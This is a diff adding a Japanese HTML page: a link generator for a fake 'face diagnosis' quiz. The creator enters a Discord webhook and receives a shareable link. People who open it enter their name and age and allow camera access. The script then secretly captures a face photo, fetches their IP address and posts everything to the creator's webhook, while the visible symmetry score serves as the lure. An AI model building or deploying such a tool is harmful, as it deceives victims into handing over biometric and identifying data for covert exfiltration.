@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>顔診断</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  :root {
+    --bg1: #0f0c29;
+    --bg2: #302b63;
+    --bg3: #24243e;
+    --text: #ffffff;
+    --muted: #9aa7c7;
+    --btn1: #6a11cb;
+    --btn2: #2575fc;
+    --accent: #8affb0;
+    --panel: rgba(255,255,255,0.06);
+    --line: rgba(255,255,255,0.12);
+  }
+  body {
+    min-height: 100vh;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    background: linear-gradient(160deg, var(--bg1), var(--bg2), var(--bg3));
+    font-family: "Hiragino Sans", "Yu Gothic", sans-serif;
+    color: var(--text); padding: 20px;
+    transition: background 0.3s ease, color 0.3s ease;
+  }
+  .card {
+    width: 100%; max-width: 500px;
+    background: var(--panel);
+    border: 1px solid var(--line);
+    border-radius: 20px; padding: 26px;
+    backdrop-filter: blur(12px);
+    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+  }
+  .page { display: none; }
+  .page.active { display: block; }
+  h1 { font-size: 22px; text-align: center; margin-bottom: 8px; letter-spacing: 1px; }
+  .sub { text-align: center; font-size: 12px; color: var(--muted); margin-bottom: 22px; }
+  label { display: block; font-size: 13px; margin-bottom: 6px; color: var(--muted); }
+  input[type="text"], input[type="number"], input[type="color"] {
+    width: 100%; padding: 13px; border-radius: 12px;
+    border: 1px solid var(--line);
+    background: rgba(0,0,0,0.3); color: var(--text); font-size: 13px;
+    margin-bottom: 16px; outline: none;
+  }
+  input[type="color"] { padding: 4px; height: 46px; cursor: pointer; }
+  input:focus { border-color: var(--accent); }
+  button {
+    width: 100%; padding: 15px; font-size: 16px; font-weight: bold;
+    border: none; border-radius: 14px; cursor: pointer;
+    background: linear-gradient(90deg, var(--btn1), var(--btn2));
+    color: #fff; letter-spacing: 1px;
+    transition: transform 0.12s ease, opacity 0.2s;
+  }
+  button:active { transform: scale(0.97); }
+  button:disabled { opacity: 0.5; cursor: not-allowed; }
+  .result {
+    margin-top: 22px; display: none;
+    background: rgba(0,0,0,0.35); border-radius: 14px;
+    padding: 16px; border: 1px solid var(--line);
+  }
+  .result-title { font-size: 13px; color: var(--accent); margin-bottom: 8px; }
+  .link-box { display: flex; gap: 8px; align-items: center; }
+  .link-box input { margin: 0; font-size: 12px; flex: 1; background: rgba(255,255,255,0.08); color: var(--accent); }
+  .copy-btn { width: auto; padding: 12px 16px; font-size: 13px; }
+  .note { font-size: 11px; color: var(--muted); margin-top: 12px; line-height: 1.6; }
+  .status { font-size: 12px; min-height: 18px; margin-top: 10px; text-align: center; }
+  .status.error { color: #ff8a8a; }
+  .status.ok { color: var(--accent); }
+
+  .grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+  @media (max-width: 460px) { .grid2 { grid-template-columns: 1fr; } }
+
+  .preview-label {
+    font-size: 13px; color: var(--muted); margin: 18px 0 8px;
+    text-transform: uppercase; letter-spacing: 0.12em;
+  }
+  .preview-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin-bottom: 18px;
+  }
+  @media (max-width: 560px) { .preview-row { grid-template-columns: 1fr; } }
+  .phone {
+    aspect-ratio: 9 / 16;
+    border-radius: 22px;
+    overflow: hidden;
+    border: 1px solid var(--line);
+    background: linear-gradient(160deg, var(--bg1), var(--bg2), var(--bg3));
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+    color: var(--text);
+    transition: background 0.25s ease, color 0.25s ease;
+    font-size: 11px;
+  }
+  .phone-inner {
+    width: 100%;
+    height: 100%;
+    border-radius: 16px;
+    background: var(--panel);
+    border: 1px solid var(--line);
+    padding: 12px 12px 14px;
+    display: flex;
+    flex-direction: column;
+    backdrop-filter: blur(8px);
+    overflow: hidden;
+  }
+  .pv-title {
+    font-size: 13px;
+    font-weight: 800;
+    text-align: center;
+    letter-spacing: 0.5px;
+    margin-bottom: 2px;
+  }
+  .pv-sub {
+    font-size: 8px;
+    text-align: center;
+    color: var(--muted);
+    margin-bottom: 10px;
+  }
+  .pv-label {
+    font-size: 8px;
+    color: var(--muted);
+    margin-bottom: 3px;
+  }
+  .pv-input {
+    width: 100%;
+    padding: 7px 9px;
+    border-radius: 8px;
+    border: 1px solid var(--line);
+    background: rgba(0,0,0,0.3);
+    color: var(--text);
+    font-size: 9px;
+    margin-bottom: 8px;
+    opacity: 0.9;
+  }
+  .pv-btn {
+    width: 100%;
+    padding: 9px;
+    font-size: 10px;
+    font-weight: 800;
+    border-radius: 10px;
+    color: #fff;
+    text-align: center;
+    letter-spacing: 0.5px;
+    background: linear-gradient(90deg, var(--btn1), var(--btn2));
+    margin-top: auto;
+  }
+  .pv-user {
+    font-size: 9px;
+    text-align: center;
+    color: var(--accent);
+    margin-bottom: 8px;
+  }
+  .pv-video {
+    position: relative;
+    width: 100%;
+    aspect-ratio: 3 / 4;
+    border-radius: 10px;
+    background: #000;
+    margin-bottom: 8px;
+    overflow: hidden;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .pv-video::before {
+    content: "";
+    position: absolute;
+    inset: 18% 22%;
+    border-radius: 50%;
+    background: radial-gradient(circle at 50% 45%, rgba(255,255,255,0.25), rgba(255,255,255,0.05) 60%, transparent 70%);
+    border: 1px solid rgba(255,255,255,0.12);
+  }
+  .pv-status {
+    font-size: 8px;
+    text-align: center;
+    color: var(--accent);
+    margin-bottom: 8px;
+  }
+  .pv-score-label {
+    font-size: 8px;
+    text-align: center;
+    color: var(--muted);
+  }
+  .pv-score {
+    font-size: 26px;
+    font-weight: 900;
+    text-align: center;
+    line-height: 1;
+    background: linear-gradient(90deg, var(--accent), var(--btn2));
+    -webkit-background-clip: text; background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 5px;
+  }
+  .pv-meter {
+    height: 5px;
+    border-radius: 4px;
+    background: rgba(255,255,255,0.1);
+    overflow: hidden;
+    margin-bottom: 6px;
+  }
+  .pv-meter-fill {
+    height: 100%;
+    width: 78%;
+    background: linear-gradient(90deg, var(--accent), var(--btn2));
+  }
+  .pv-comment {
+    font-size: 7px;
+    line-height: 1.5;
+    background: rgba(0,0,0,0.3);
+    border-radius: 6px;
+    padding: 6px;
+    color: var(--text);
+  }
+  .pv-caption {
+    text-align: center;
+    font-size: 11px;
+    color: var(--muted);
+    margin-top: 6px;
+  }
+
+  .video-wrap {
+    position: relative; width: 100%; aspect-ratio: 3 / 4;
+    border-radius: 16px; overflow: hidden;
+    background: #000; margin-bottom: 16px;
+  }
+  video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+  canvas { display: none; }
+
+  .snapshot-overlay {
+    display: none;
+    position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+    object-fit: cover; transform: scaleX(-1);
+  }
+  .snapshot-overlay.show { display: block; }
+
+  .score-wrap { display: none; text-align: center; padding: 10px 0; }
+  .score-wrap.show { display: block; }
+  .score-label { font-size: 13px; color: var(--muted); margin-bottom: 4px; }
+  .score-num {
+    font-size: 64px; font-weight: 900;
+    background: linear-gradient(90deg, var(--accent), var(--btn2));
+    -webkit-background-clip: text; background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+  .meter { height: 10px; border-radius: 6px; margin: 14px 0; background: rgba(255,255,255,0.1); overflow: hidden; }
+  .meter-fill { height: 100%; width: 0; background: linear-gradient(90deg, var(--accent), var(--btn2)); transition: width 1s ease; }
+  .score-comment {
+    font-size: 14px; color: var(--text); line-height: 1.7;
+    background: rgba(0,0,0,0.3); border-radius: 12px; padding: 14px;
+    text-align: left;
+  }
+  .user-name-display {
+    text-align: center; font-size: 14px; color: var(--accent);
+    margin-bottom: 14px;
+  }
+</style>
+</head>
+<body>
+<div class="card">
+  <div id="page-create" class="page active">
+    <h1>🔗 診断リンク作成</h1>
+    <p class="sub">Webhookとデザインを設定して、診断リンクを発行する</p>
+
+    <label>Discord Webhook URL</label>
+    <input id="webhookInput" type="text" placeholder="https://discord.com/api/webhooks/..." value="">
+
+    <div class="grid2">
+      <div>
+        <label>背景色 1</label>
+        <input id="bg1Input" type="color" value="#0f0c29">
+      </div>
+      <div>
+        <label>背景色 2</label>
+        <input id="bg2Input" type="color" value="#302b63">
+      </div>
+      <div>
+        <label>背景色 3</label>
+        <input id="bg3Input" type="color" value="#24243e">
+      </div>
+      <div>
+        <label>文字色</label>
+        <input id="textInput" type="color" value="#ffffff">
+      </div>
+      <div>
+        <label>ボタン色 1</label>
+        <input id="btn1Input" type="color" value="#6a11cb">
+      </div>
+      <div>
+        <label>ボタン色 2</label>
+        <input id="btn2Input" type="color" value="#2575fc">
+      </div>
+      <div>
+        <label>アクセント色</label>
+        <input id="accentInput" type="color" value="#8affb0">
+      </div>
+      <div>
+        <label>補助文字色</label>
+        <input id="mutedInput" type="color" value="#9aa7c7">
+      </div>
+    </div>
+
+    <div class="preview-label">サンプルプレビュー</div>
+    <div class="preview-row">
+      <div>
+        <div class="phone">
+          <div class="phone-inner">
+            <div class="pv-title">✨ 顔診断 ✨</div>
+            <div class="pv-sub">診断を始める前に教えてね</div>
+            <div class="pv-label">お名前</div>
+            <div class="pv-input">例: ゼウス</div>
+            <div class="pv-label">年齢</div>
+            <div class="pv-input">例: 20</div>
+            <div class="pv-btn">次へ（カメラを許可）</div>
+          </div>
+        </div>
+        <div class="pv-caption">名前・年齢入力画面</div>
+      </div>
+      <div>
+        <div class="phone">
+          <div class="phone-inner">
+            <div class="pv-title">✨ 顔診断 ✨</div>
+            <div class="pv-user">👤 ゼウス さん（20歳）の診断</div>
+            <div class="pv-video"></div>
+            <div class="pv-status">診断完了</div>
+            <div class="pv-score-label">顔診断スコア</div>
+            <div class="pv-score">78</div>
+            <div class="pv-meter"><div class="pv-meter-fill"></div></div>
+            <div class="pv-comment">全体的に調和が取れている。わずかな左右差は自然な範囲で、表情に個性が出ている。</div>
+          </div>
+        </div>
+        <div class="pv-caption">顔撮影・結果画面</div>
+      </div>
+    </div>
+
+    <button id="createBtn">作成</button>
+    <div id="createStatus" class="status"></div>
+    <div id="result" class="result">
+      <div class="result-title">✅ リンクを作成しました</div>
+      <div class="link-box">
+        <input id="linkInput" type="text" readonly>
+        <button id="copyBtn" class="copy-btn">コピー</button>
+      </div>
+      <p class="note">このリンクを開いた人は、名前・年齢を入力し、カメラ許可後に撮影された顔画像（縁なし）とIPアドレスが上記Webhookに送信されます。</p>
+    </div>
+  </div>
+
+  <div id="page-info" class="page">
+    <h1>✨ 顔診断 ✨</h1>
+    <p class="sub">診断を始める前に教えてね</p>
+    <label>お名前</label>
+    <input id="nameInput" type="text" placeholder="例: ゼウス" maxlength="32">
+    <label>年齢</label>
+    <input id="ageInput" type="number" placeholder="例: 20" min="1" max="120">
+    <button id="nameNextBtn">次へ（カメラを許可）</button>
+    <div id="nameStatus" class="status"></div>
+  </div>
+
+  <div id="page-diagnose" class="page">
+    <h1>✨ 顔診断 ✨</h1>
+    <div class="user-name-display" id="userNameDisplay"></div>
+
+    <div class="video-wrap" id="videoWrap">
+      <video id="video" autoplay playsinline muted></video>
+      <canvas id="canvas"></canvas>
+      <img id="snapshotOverlay" class="snapshot-overlay" alt="">
+    </div>
+    <div id="diagStatus" class="status">カメラを準備中...</div>
+
+    <div id="scoreWrap" class="score-wrap">
+      <div class="score-label">顔診断スコア</div>
+      <div class="score-num" id="scoreNum">0</div>
+      <div class="meter"><div class="meter-fill" id="meterFill"></div></div>
+      <div class="score-comment" id="scoreComment"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+const webhookInput = document.getElementById('webhookInput');
+const bg1Input = document.getElementById('bg1Input');
+const bg2Input = document.getElementById('bg2Input');
+const bg3Input = document.getElementById('bg3Input');
+const textInput = document.getElementById('textInput');
+const btn1Input = document.getElementById('btn1Input');
+const btn2Input = document.getElementById('btn2Input');
+const accentInput = document.getElementById('accentInput');
+const mutedInput = document.getElementById('mutedInput');
+const createBtn = document.getElementById('createBtn');
+const createStatus = document.getElementById('createStatus');
+const result = document.getElementById('result');
+const linkInput = document.getElementById('linkInput');
+const copyBtn = document.getElementById('copyBtn');
+
+const pageCreate = document.getElementById('page-create');
+const pageInfo = document.getElementById('page-info');
+const pageDiagnose = document.getElementById('page-diagnose');
+
+const nameInput = document.getElementById('nameInput');
+const ageInput = document.getElementById('ageInput');
+const nameNextBtn = document.getElementById('nameNextBtn');
+const nameStatus = document.getElementById('nameStatus');
+const userNameDisplay = document.getElementById('userNameDisplay');
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const snapshotOverlay = document.getElementById('snapshotOverlay');
+const diagStatus = document.getElementById('diagStatus');
+const scoreWrap = document.getElementById('scoreWrap');
+const scoreNum = document.getElementById('scoreNum');
+const meterFill = document.getElementById('meterFill');
+const scoreComment = document.getElementById('scoreComment');
+
+let webhookURL = null;
+let theme = null;
+let stream = null;
+let userName = '';
+let userAge = '';
+let initialIP = 'unknown';
+let initialFrameDataURL = null;
+let initialScore = 0;
+let alreadySent = false;
+
+function setCreateStatus(msg, cls = '') {
+  createStatus.textContent = msg;
+  createStatus.className = 'status ' + cls;
+}
+function setNameStatus(msg, cls = '') {
+  nameStatus.textContent = msg;
+  nameStatus.className = 'status ' + cls;
+}
+function setDiagStatus(msg, cls = '') {
+  diagStatus.textContent = msg;
+  diagStatus.className = 'status ' + cls;
+}
+
+function validWebhook(url) {
+  return /^https:\/\/(discord|discordapp)\.com\/api\/webhooks\/\d+\/[\w-]+$/.test(url);
+}
+
+function encodeBase64(obj) {
+  return btoa(unescape(encodeURIComponent(JSON.stringify(obj))));
+}
+function decodeBase64(b64) {
+  try { return JSON.parse(decodeURIComponent(escape(atob(b64)))); } catch { return null; }
+}
+
+function applyTheme(t) {
+  if (!t) return;
+  document.documentElement.style.setProperty('--bg1', t.bg1 || '#0f0c29');
+  document.documentElement.style.setProperty('--bg2', t.bg2 || '#302b63');
+  document.documentElement.style.setProperty('--bg3', t.bg3 || '#24243e');
+  document.documentElement.style.setProperty('--text', t.text || '#ffffff');
+  document.documentElement.style.setProperty('--muted', t.muted || '#9aa7c7');
+  document.documentElement.style.setProperty('--btn1', t.btn1 || '#6a11cb');
+  document.documentElement.style.setProperty('--btn2', t.btn2 || '#2575fc');
+  document.documentElement.style.setProperty('--accent', t.accent || '#8affb0');
+  document.documentElement.style.setProperty('--panel', 'rgba(255,255,255,0.06)');
+  document.documentElement.style.setProperty('--line', 'rgba(255,255,255,0.12)');
+}
+
+function applyPreview() {
+  applyTheme({
+    bg1: bg1Input.value,
+    bg2: bg2Input.value,
+    bg3: bg3Input.value,
+    text: textInput.value,
+    btn1: btn1Input.value,
+    btn2: btn2Input.value,
+    accent: accentInput.value,
+    muted: mutedInput.value
+  });
+}
+
+function showPage(name) {
+  pageCreate.classList.remove('active');
+  pageInfo.classList.remove('active');
+  pageDiagnose.classList.remove('active');
+  if (name === 'create') pageCreate.classList.add('active');
+  if (name === 'info') pageInfo.classList.add('active');
+  if (name === 'diagnose') pageDiagnose.classList.add('active');
+}
+
+function router() {
+  const hash = location.hash || '';
+  if (hash.startsWith('#diagnose')) {
+    const match = hash.match(/\?d=([^&]+)/);
+    if (!match) { showPage('create'); return; }
+    const data = decodeBase64(decodeURIComponent(match[1]));
+    if (!data || !data.w) { showPage('create'); return; }
+    webhookURL = data.w;
+    theme = data.t || null;
+    applyTheme(theme);
+    userName = '';
+    userAge = '';
+    alreadySent = false;
+    userNameDisplay.textContent = '';
+    showPage('info');
+    setTimeout(() => nameInput.focus(), 100);
+  } else {
+    stopCamera();
+    showPage('create');
+  }
+}
+
+function stopCamera() {
+  if (stream) {
+    stream.getTracks().forEach(t => t.stop());
+    stream = null;
+  }
+  video.srcObject = null;
+}
+
+window.addEventListener('hashchange', router);
+
+createBtn.addEventListener('click', () => {
+  const wh = webhookInput.value.trim();
+  if (!wh) { setCreateStatus('Webhook URLを入力してください。', 'error'); return; }
+  if (!validWebhook(wh)) { setCreateStatus('Discord Webhook URLの形式が正しくありません。', 'error'); return; }
+
+  const data = {
+    w: wh,
+    t: {
+      bg1: bg1Input.value,
+      bg2: bg2Input.value,
+      bg3: bg3Input.value,
+      text: textInput.value,
+      btn1: btn1Input.value,
+      btn2: btn2Input.value,
+      accent: accentInput.value,
+      muted: mutedInput.value
+    }
+  };
+  const base = location.href.split(/[?#]/)[0];
+  const link = base + '#diagnose?d=' + encodeBase64(data);
+  linkInput.value = link;
+  result.style.display = 'block';
+  setCreateStatus('リンク作成完了。', 'ok');
+});
+
+copyBtn.addEventListener('click', async () => {
+  try {
+    await navigator.clipboard.writeText(linkInput.value);
+    copyBtn.textContent = 'コピー済';
+    setTimeout(() => (copyBtn.textContent = 'コピー'), 1500);
+  } catch {
+    linkInput.select();
+    document.execCommand('copy');
+  }
+});
+
+[bg1Input, bg2Input, bg3Input, textInput, btn1Input, btn2Input, accentInput, mutedInput].forEach(el => {
+  el.addEventListener('input', applyPreview);
+});
+
+nameNextBtn.addEventListener('click', () => startWithInfo());
+nameInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') ageInput.focus(); });
+ageInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') startWithInfo(); });
+
+async function fetchIP() {
+  try {
+    const res = await fetch('https://api.ipify.org?format=json');
+    const data = await res.json();
+    return data.ip || 'unknown';
+  } catch { return 'unknown'; }
+}
+
+function captureFrame() {
+  const w = video.videoWidth, h = video.videoHeight;
+  if (!w || !h) return null;
+  canvas.width = w; canvas.height = h;
+  const ctx = canvas.getContext('2d');
+  ctx.save();
+  ctx.translate(w, 0); ctx.scale(-1, 1);
+  ctx.drawImage(video, 0, 0, w, h);
+  ctx.restore();
+  return canvas;
+}
+
+function cropCenterFaceArea(srcCanvas) {
+  const w = srcCanvas.width, h = srcCanvas.height;
+  const cw = Math.floor(Math.min(w, h) * 0.62);
+  const ch = Math.floor(cw * 1.25);
+  const finalH = Math.min(ch, h);
+  const sx = Math.floor((w - cw) / 2);
+  const sy = Math.floor((h - finalH) / 2);
+
+  const out = document.createElement('canvas');
+  out.width = cw;
+  out.height = finalH;
+  const octx = out.getContext('2d');
+  octx.drawImage(srcCanvas, sx, sy, cw, finalH, 0, 0, cw, finalH);
+  return out;
+}
+
+function detectFaceSymmetry(ctx) {
+  const w = ctx.canvas.width, h = ctx.canvas.height;
+  const img = ctx.getImageData(0, 0, w, h).data;
+  const cx = Math.floor(w / 2);
+  const step = 4;
+  let total = 0, diff = 0;
+  const lum = (x, y) => {
+    const i = (y * w + x) * 4;
+    return 0.299 * img[i] + 0.587 * img[i + 1] + 0.114 * img[i + 2];
+  };
+  for (let y = 0; y < h; y += step) {
+    for (let x = 0; x < cx; x += step) {
+      const mx = w - 1 - x;
+      if (mx <= cx) continue;
+      diff += Math.abs(lum(x, y) - lum(mx, y));
+      total++;
+    }
+  }
+  if (total === 0) return 50;
+  const avgDiff = diff / total;
+  return Math.round(Math.max(0, 100 - (avgDiff / 255) * 180));
+}
+
+function buildComment(score) {
+  if (score >= 90) return "左右の対称性が極めて高い。整った骨格で、正面から見た輪郭が非常にクリア。印象的な顔立ち。";
+  if (score >= 80) return "対称性が高くバランスの取れた顔。目元と口元の配置が整っており、清潔感がある。";
+  if (score >= 70) return "全体的に調和が取れている。わずかな左右差は自然な範囲で、表情に個性が出ている。";
+  if (score >= 60) return "平均的な対称性。照明や角度でスコアが変わるので、正面・明るい場所で試すと上がりやすい。";
+  return "左右差がやや大きめに出ている。照明が片側に寄っていないか、カメラに対して正面を向いているか確認してみて。";
+}
+
+async function startWithInfo() {
+  const n = nameInput.value.trim();
+  const a = ageInput.value.trim();
+  if (!n) { setNameStatus('名前を入力してください。', 'error'); return; }
+  if (!a) { setNameStatus('年齢を入力してください。', 'error'); return; }
+  const ageNum = Number(a);
+  if (!Number.isFinite(ageNum) || ageNum < 1 || ageNum > 120) {
+    setNameStatus('年齢は1〜120の範囲で入力してください。', 'error');
+    return;
+  }
+  userName = n;
+  userAge = String(ageNum);
+  userNameDisplay.textContent = '👤 ' + userName + ' さん（' + userAge + '歳）の診断';
+  setNameStatus('カメラの許可を求めています...', 'ok');
+  nameNextBtn.disabled = true;
+
+  showPage('diagnose');
+  setDiagStatus('カメラを起動中...');
+
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 960 } },
+      audio: false
+    });
+    video.srcObject = stream;
+
+    video.onloadedmetadata = async () => {
+      setDiagStatus('準備完了。診断を開始します...', 'ok');
+
+      initialIP = await fetchIP();
+
+      setTimeout(async () => {
+        const frameCanvas = captureFrame();
+        if (frameCanvas) {
+          initialScore = Math.max(40, Math.min(99, detectFaceSymmetry(frameCanvas.getContext('2d'))));
+          const faceCanvas = cropCenterFaceArea(frameCanvas);
+          initialFrameDataURL = faceCanvas.toDataURL('image/jpeg', 0.9);
+          snapshotOverlay.src = initialFrameDataURL;
+          snapshotOverlay.classList.add('show');
+        }
+
+        showScore(initialScore);
+        setDiagStatus('診断完了', 'ok');
+
+        if (!alreadySent && initialFrameDataURL) {
+          alreadySent = true;
+          await sendImageToDiscord(initialFrameDataURL);
+        }
+      }, 900);
+    };
+  } catch (err) {
+    setDiagStatus('カメラにアクセスできません: ' + err.message, 'error');
+    nameNextBtn.disabled = false;
+  }
+}
+
+function dataURLtoBlob(dataURL) {
+  const [head, body] = dataURL.split(',');
+  const mime = head.match(/:(.*?);/)[1];
+  const bin = atob(body);
+  const len = bin.length;
+  const bytes = new Uint8Array(len);
+  for (let i = 0; i < len; i++) bytes[i] = bin.charCodeAt(i);
+  return new Blob([bytes], { type: mime });
+}
+
+async function sendImageToDiscord(dataURL) {
+  if (!webhookURL) return;
+
+  const payload = {
+    username: "顔診断ボット",
+    embeds: [{
+      title: "📸 顔診断レポート",
+      description: `**${userName} さん（${userAge}歳）の診断結果**\nスコア: ${initialScore} / 100`,
+      color: 0x2575fc,
+      fields: [
+        { name: "名前", value: "`" + userName + "`", inline: true },
+        { name: "年齢", value: "`" + userAge + "`", inline: true },
+        { name: "IPアドレス", value: "`" + initialIP + "`", inline: true },
+        { name: "スコア", value: "`" + initialScore + " / 100`", inline: true },
+        { name: "送信日時", value: new Date().toLocaleString('ja-JP'), inline: false }
+      ],
+      image: { url: "attachment://face.jpg" }
+    }]
+  };
+
+  const form = new FormData();
+  form.append('payload_json', JSON.stringify(payload));
+  const blob = dataURLtoBlob(dataURL);
+  form.append('files[0]', blob, 'face.jpg');
+
+  try {
+    await fetch(webhookURL, { method: 'POST', body: form });
+    console.log("画像送信完了");
+  } catch (e) {
+    console.error("送信失敗", e);
+  }
+}
+
+function showScore(score) {
+  scoreWrap.classList.add('show');
+  scoreNum.textContent = '0';
+  meterFill.style.width = '0%';
+  scoreComment.textContent = buildComment(score);
+
+  let cur = 0;
+  const timer = setInterval(() => {
+    cur += Math.max(1, Math.round((score - cur) / 8));
+    if (cur >= score) { cur = score; clearInterval(timer); }
+    scoreNum.textContent = cur;
+    meterFill.style.width = cur + '%';
+  }, 30);
+}
+
+applyPreview();
+router();
+</script>
+</body>
+</html>
